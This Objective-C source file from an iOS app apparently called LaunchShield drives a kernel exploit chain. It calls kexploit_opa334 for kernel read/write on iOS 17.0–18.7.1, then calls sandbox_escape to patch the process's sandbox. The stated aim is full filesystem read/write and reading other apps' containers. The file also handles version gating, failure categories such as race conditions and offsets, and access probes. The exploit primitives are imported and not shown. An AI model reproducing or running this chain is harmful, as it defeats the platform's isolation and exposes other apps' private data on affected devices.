//
//  WQKernel.m
//  LaunchShield
//
//  GPL-3.0-or-later. The kernel chain itself is YangJiii's
//  upstream project (GPL-3.0):
//  kexploit_opa334 establishes kernel read/write, then sandbox_escape patches
//  this process's sandbox extension set so plain file calls work everywhere.
//  This file only sequences the two stages and caches the result.
//

#import "WQKernel.h"
#import "WQAccess.h"
#import "WQAppCatalog.h"
#import "kexploit/kexploit_opa334.h"
#import "kexploit/kutils.h"
#import "kexploit/machine_info.h"
#import "kexploit/sandbox_escape.h"
#import <sys/sysctl.h>

static NSLock *gKernelLock;
static BOOL gKernelActive;
static BOOL gKernelRunning;
static BOOL gKernelFailed;
static BOOL gKernelAttempted;

static NSLock *wq_kernel_lock(void)
{
    static NSLock *lock;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ lock = [NSLock new]; });
    return lock;
}

BOOL wq_kernel_unsupported_a10_ios17(void)
{
    NSOperatingSystemVersion v = NSProcessInfo.processInfo.operatingSystemVersion;
    if (v.majorVersion != 17) return NO;
    uint32_t family = 0;
    size_t size = sizeof(family);
    if (sysctlbyname("hw.cpufamily", &family, &size, NULL, 0) != 0 || size != sizeof(family)) return NO;
    return family == CPUFAMILY_ARM_HURRICANE;
}

BOOL wq_kernel_supported(void)
{
    NSOperatingSystemVersion v = NSProcessInfo.processInfo.operatingSystemVersion;
    if (v.majorVersion == 17) return v.minorVersion <= 7 && !wq_kernel_unsupported_a10_ios17();
    if (v.majorVersion == 18) {
        return v.minorVersion < 7 || (v.minorVersion == 7 && v.patchVersion <= 1);
    }
    return NO;
}

BOOL wq_kernel_active(void)
{
    if (!wq_kernel_supported()) return NO;
    NSLock *lock = wq_kernel_lock();
    [lock lock];
    BOOL active = gKernelActive;
    [lock unlock];
    return active;
}

BOOL wq_kernel_running(void)
{
    if (!wq_kernel_supported()) return NO;
    NSLock *lock = wq_kernel_lock();
    [lock lock];
    BOOL running = gKernelRunning;
    [lock unlock];
    return running;
}

BOOL wq_kernel_failed(void)
{
    if (!wq_kernel_supported()) return NO;
    NSLock *lock = wq_kernel_lock();
    [lock lock];
    BOOL failed = gKernelFailed;
    [lock unlock];
    return failed;
}

BOOL wq_kernel_start(void)
{
    NSLock *lock = wq_kernel_lock();
    [lock lock];
    if (gKernelAttempted) {
        [lock unlock];
        wq_log(@"kernel: 本进程已尝试过，需重启应用（this process has already attempted the kernel channel）");
        return NO;
    }
    // Consume the one-shot latch before any checks or work. Every result,
    // including an unsupported OS or a stage-2 failure, requires relaunch.
    gKernelAttempted = YES;
    [lock unlock];

    if (!wq_kernel_supported()) {
        [lock lock];
        gKernelFailed = YES;
        [lock unlock];
        wq_log(@"kernel: this iOS version is outside the verified 17.0-18.7.1 range; not starting");
        return NO;
    }

    [lock lock];
    gKernelRunning = YES;
    gKernelFailed = NO;
    [lock unlock];

    // The kernel stage is the one moment the app must not compete with its own
    // file scans for CPU, I/O and memory. Existing scans park at their next
    // checkpoint; they resume when the stage finishes, succeeds or fails.
    wq_scan_set_paused(YES);

    // Stage 1: kernel read/write. FAILURE() inside the exploit phase returns
    // an error code instead of terminating the process.
    wq_log(@"kernel: stage 1/2, kernel read/write (kexploit_opa334); this takes 1-3 min on iOS 17/18 - keep the app in the foreground");
    int exploit = kexploit_opa334();
    // First line after the kernel stage returns. If this is missing from the
    // export, the process died inside kexploit_opa334 (or in its final sleep),
    // not in stage 2.
    wq_log(@"kernel: kexploit returned %d", exploit);
    wq_scan_set_paused(NO);
    if (exploit != 0) {
        [lock lock];
        gKernelRunning = NO;
        gKernelFailed = YES;
        [lock unlock];

        if (exploit == -KEXPLOIT_ERROR_UNSUPPORTED_OFFSETS) {
            wq_log(@"kernel: stage 1 failed [category=unsupported-offsets, point=offsets_init]; code=%d", exploit);
        } else if (exploit == -KEXPLOIT_ERROR_RACE) {
            wq_log(@"kernel: stage 1 failed [category=race, point=free_thread:mach_vm_map]; code=%d", exploit);
        } else {
            wq_log(@"kernel: stage 1 failed [category=other]; code=%d; inspect the preceding kexploit point log", exploit);
        }
        return NO;
    }
    wq_log(@"kernel: kernel read/write is up");

    // Stage 2: patch this process's sandbox so ordinary file calls reach
    // every container. Without it LaunchShield cannot read other apps' data.
    // The escape works from the credential, so a proc that cannot be resolved
    // (so_background_thread is 0 on iOS 17/18) is no longer fatal: the
    // credential our own socket carries is the object the sandbox lives in.
    wq_log(@"kernel: stage 2/2, sandbox escape (sandbox_escape)");
    // proc_self() walks the socket's so_background_thread field. On iOS 17/18
    // that field is usually 0; when it holds a stale non-zero value, the
    // speculative kread hits an unmapped address and early_kread aborts before
    // the credential fallback can run (build 8 log: getsockopt failed in
    // wq_proc_from_thread). Stage 2 only needs the socket credential, so skip
    // the optional proc walk and let sandbox_escape(0) use ucred_self().
    uint64_t selfProc = 0;
    wq_log(@"kernel: stage 2 uses the socket credential (proc walk skipped)");
    // sandbox_escape() already writes, reads back and deletes probe files; it
    // returns 0 only when that probe passed, so trust it here.
    int escape = sandbox_escape(selfProc);
    // Log the per-root probe result even on failure: "escape returned -1" alone
    // does not tell whether app containers or only system data were reachable.
    char probeReport[512] = {0};
    int probesPassed = sandbox_probe_report(probeReport, sizeof(probeReport));
    NSString *probeText = probeReport[0]
        ? [NSString stringWithUTF8String:probeReport] : @"";
    wq_log(@"kernel: sandbox probes: %@ (passed=%d)",
           probeText.length ? probeText : @"none", probesPassed);
    BOOL active = escape == 0;
    if (active && probeText.length &&
        ![probeText containsString:@"Data/Application=ok"]) {
        wq_log(@"kernel: sandbox active, but the app-container root probe failed; container listing may be limited");
    }

    [lock lock];
    gKernelRunning = NO;
    gKernelActive = active;
    gKernelFailed = !active;
    [lock unlock];

    // The first LaunchServices lookup can run before the kernel escape and
    // cache an empty catalog, which leaves the picker with bundle ids, no app
    // names, and an empty extension set. Rebuild it now that LS is reachable.
    if (active) {
        wq_app_catalog_invalidate();
    }

    if (active) {
        wq_log(@"kernel: sandbox escaped; full filesystem read/write is available");
    } else if (selfProc == 0) {
        wq_log(@"kernel: no proc was resolved and the socket credential did not escape; the chain is not active");
    } else {
        wq_log(@"kernel: sandbox_escape returned %d; the chain is not active", escape);
    }
    return active;
}
